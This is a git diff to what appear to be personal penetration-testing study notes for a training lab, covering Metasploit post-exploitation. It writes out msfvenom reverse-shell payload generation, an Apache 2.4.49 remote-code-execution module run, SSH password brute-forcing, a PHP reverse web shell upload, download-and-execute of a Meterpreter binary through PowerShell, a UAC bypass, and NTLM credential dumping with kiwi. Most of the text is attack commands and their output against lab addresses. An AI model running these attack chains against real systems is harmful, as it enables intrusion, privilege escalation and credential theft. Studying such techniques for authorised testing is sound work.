@@ -1913,7 +1913,7 @@ Reference
   ```
 
 **Post-Exploitation with metasploit**
-- Create a Windows executable with a Meterpreter reverse shell payload
+- Create a Windows executable with a Meterpreter reverse shell payload  
   `kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe`
 - start multi/handler and set options
   ```
@@ -1932,21 +1932,21 @@ Reference
   ``` 
 - Display idle time from current user
   `meterpreter > idletime`
-- Display the assigned privileges to our user in an interactive shell
+- Display the assigned privileges to our user in an interactive shell  
   ```
   meterpreter > shell
   C:\Users\luiza> whoami /priv
   ...
   SeImpersonatePrivilege
   ```
-- Elevate our privileges with getsystem
+- Elevate our privileges with getsystem  
   ```  
   meterpreter > getsystem
   meterpreter > getuid
   ...
   Server username: NT AUTHORITY\SYSTEM
   ```
-- Display list of running processe
+- Display list of running processe  
   ```
   meterpreter > ps
   ...
@@ -1954,19 +1954,58 @@ Reference
   2552   8500  met.exe
   8052   4892  OneDrive.exe
   ```
-- Migrate to explorer.exe
+- Migrate to explorer.exe  
   ```
   meterpreter > migrate 8052
   [*] Migrating from 2552 to 8052... 
   ```
-- Migrate to a newly spawned Notepad process
+- Migrate to a newly spawned Notepad process  
   ```
   meterpreter > execute -H -f notepad
   Process 2720 created
   meterpreter > migrate 2720
   ```
-- ddd
-- ddd
+- Reviewing integrity level  
+  ```
+  meterpreter > shell
+  C:\Windows\system32> powershell -ep bypass
+  PS C:\Windows\system32> Import-Module NtObjectManager
+  PS C:\Windows\system32> Get-NtTokenIntegrityLevel
+  ...
+  Medium
+  ```
+- Background channel and session  
+  ```
+  PS C:\Windows\system32> ^Z
+  meterpreter > bg
+  ```
+- Search for UAC bypass modules
+  ```
+  msf6 exploit(multi/handler) > search UAC
+  ...
+   11  exploit/windows/local/bypassuac_sdclt
+  ```
+- Executing a UAC bypass using a Meterpreter session  
+  ```
+  msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
+  msf6 exploit(windows/local/bypassuac_sdclt) > show options
+  msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
+  msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
+  msf6 exploit(windows/local/bypassuac_sdclt) > run
+  ...
+  PS C:\Windows\system32> Get-NtTokenIntegrityLevel
+  Get-NtTokenIntegrityLevel
+  High
+  ```
+- Load the Kiwi module and execute creds_msv to retrieve credentials of the system  
+  ```
+  meterpreter > load kiwi
+  meterpreter > help
+  ...
+  Command                Description
+  creds_msv				 Retrieve LM/NTLM creds (parsed)
+  ```
+  meterpreter > creds_msv
 - ddd
 
 **Automating metasploit**
@@ -3358,6 +3397,166 @@ Reference
     `command (pgdatabase01) 1> listen 0.0.0.0:4647 172.16.164.217:4646`
   - Connect to FELINEAUTHORITY via port forward 4647  
     `./dnscat_exercise_client -i 192.168.164.7 -p 4647`
+
+### The metasploit framework  
+- **setup and work with MSF - nmap**  
+  ```
+  msf6 > db_nmap -A 192.168.231.202
+  msf6 > hosts
+  msf6 > services
+  msf6 > services -p 8000
+  ```
+- **Auxiliary modules - Brute force SSH**
+  - nmap -sV 192.168.231.16 > port 20, 2222  
+  - search ssh auxiliary modules > 16 auxiliary/scanner/ssh/ssh_login
+    `msf6 > search type:auxiliary ssh` `msf6 > use 16`
+  - configure options and execute "ssh_login" module > George:chocolate
+    ```
+    msf6 auxiliary(scanner/ssh/ssh_login) > options
+    set PASS_FILE /usr/share/wordlists/rockyou.txt
+    set USERNAME george
+    set RHOSTS 192.168.231.201
+    set RPORT 2222
+    run    
+    ```
+  - ssh to VM1
+    `ssh -p 2222 george@192.168.231.201`
+- **exploit module Apache 2.4.49**
+  - nmap -sV 192.168.231.16 > port 22,80 (Apache httpd 2.4.49)  
+  - search Apache 2.4.49 modules > 0 exploit/multi/http/apache_normalize_path_rce  
+    `msf6 > search Apache 2.4.49`  
+  - set payload of the exploit module
+    ```
+    msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter/reverse_tcp
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.45.182
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.231.16
+    msf6 exploit(multi/http/apache_normalize_path_rce) > run
+
+    meterpreter > pwd
+    ```
+  - **exploit staged payload/linux/x64/shell/reverse_tcp**
+    ```
+    show payloads > 18: payload/linux/x64/shell/reverse_tcp
+    set payload 18 
+    run
+    ```
+  - **exploit payload/linux/x64/meterpreter_reverse_https**
+    ```
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/meterpreter_reverse_https
+    msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+    msf6 exploit(multi/http/apache_normalize_path_rce) > run 
+    run
+
+    meterpreter > help
+    meterpreter > search -f 'passwords'
+    meterpreter > cat /opt/passwords
+    ```
+  - **use msfvenom to create a windows staged TCP reverse shell and start a multi/handler**
+    - Listing a Windows executable with a reverse shell payload
+      `kali@kali:~$ msfvenom -l payloads --platform windows --arch x64`
+    - Creating a Windows executable with a staged TCP reverse shell payload  
+      `kali@kali:~$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe`
+    - use Metasploit's multi/handler to handle staged, non-staged interactive command prompt
+      ```
+      msf6 > use multi/handler
+      msf6 exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
+      msf6 exploit(multi/handler) > set LHOST 192.168.45.182
+      msf6 exploit(multi/handler) > set LPORT 443
+      msf6 exploit(multi/handler) > run
+      ```
+  - Use msfvenom to create a .pHP web shell (bind or reverse shell) and upload to VM2 to obtain an interactive shell
+    - nmap -sV 192.168.231.189 > port 80, 135, 139, 445, 5985, 8000
+    - enumerate web application directories > http://192.168.231.189/meteor/
+      `gobuster dir -u http://192.168.231.189/ -w /usr/share/wfuzz/wordlist/general/megabeast.txt`
+    - test upload files > "File 44976.py has been uploaded in the uploads directory!"  
+    - list the payloads for php >  php/reverse_php
+      `msfvenom -l payloads | grep php`
+    - Use msfvenom to create a .pHP web shell (bind or reverse shell)
+      `msfvenom -p php/reverse_php LHOST=192.168.45.182 LPORT=443 -f raw > shell.pHP`
+    - Trigger the Shell
+      `curl http://192.168.231.189/meteor/uploads/shell.pHP`
+    - start a listener (before trigger) and interact
+      ```
+      └─$ nc -nlvp 443
+      listening on [any] 443 ...
+      connect to [192.168.45.182] from (UNKNOWN) [192.168.231.189] 63519
+      whoami
+      ```
+- **migrate the process to OneDrive.exe**
+  - nmap -sV 192.168.231.189 > port 135, 139, 445, 3389, 44444
+  - generate windows meterpreter reverse shell payload
+    ```
+    msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.179 LPORT=443 -f exe -o met.exe
+    sudo mv met.exe /var/www/html/
+    ```
+  - setup meterpreter listener
+    ```
+    msfconsole
+    msf6 > use multi/handler
+    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
+    msf6 exploit(multi/handler) > set LPORT 443
+    msf6 exploit(multi/handler) > set LHOST 192.168.45.179
+    msf6 exploit(multi/handler) > run
+    ```
+ - connect to the bind shell on port 4444 on ITWK01,download and execute met.exe
+   ```
+   kali@kali:~$ nc 192.168.231.223 4444
+   C:\Users\luiza>powershell
+   PS C:\Users\luiza> iwr -uri http://192.168.45.179/met.exe -Outfile met.exe
+   PS C:\Users\luiza> .\met.exe
+   ```
+ - change the timeout seconds
+   ```
+   meterpreter > background
+   msf6 exploit(multi/handler) > sessions
+   msf6 exploit(multi/handler) > sessions -i 3 --timeout 30
+   msf6 exploit(multi/handler) > sessions -i 3
+   meterpreter > set_timeouts -x 30 -t 3
+   ```
+ - get flag
+   ```
+   meterpreter > getsystem  //elevate our privileges
+   meterpreter > getuid
+   meterpreter > ps
+   meterpreter > migrate -N explorer.exe
+   meterpreter > getenv Flag
+   ```
+- **Use kiwi to retrieve the NTLM hash**
+  ```
+  msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
+  msf6 exploit(windows/local/bypassuac_sdclt) > show options
+  msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.45.179
+  msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 4
+  msf6 exploit(windows/local/bypassuac_sdclt) > sessions -i 4
+
+  meterpreter > getsystem
+  meterpreter > load kiwi
+  meterpreter > help
+  meterpreter > creds_msv
+  ```
+- **UAC bypass**
+  ```
+  msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
+  msf6 exploit(windows/local/bypassuac_sdclt) > show options
+  msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
+  msf6 exploit(windows/local/bypassuac_sdclt) > set 192.168.45.179
+  msf6 exploit(windows/local/bypassuac_sdclt) > run
+
+  meterpreter > shell
+  C:\Windows\system32> powershell -ep bypass
+  PS C:\Windows\system32> Import-Module NtObjectManager
+  PS C:\Windows\system32> Get-NtTokenIntegrityLevel
+  ```
+- **Search for a post-exploitation module that enumerates the Windows Hosts file**
+  ```
+  msf6 exploit(windows/local/bypassuac_sdclt) > search hostfile
+  msf6 exploit(windows/local/bypassuac_sdclt) > use post/windows/gather/enum_hostfile
+  msf6 post(windows/gather/enum_hostfile) > set SESSION 6
+  ```
+- ddd  
 
 ## Penetration testing report 
 - note editor:
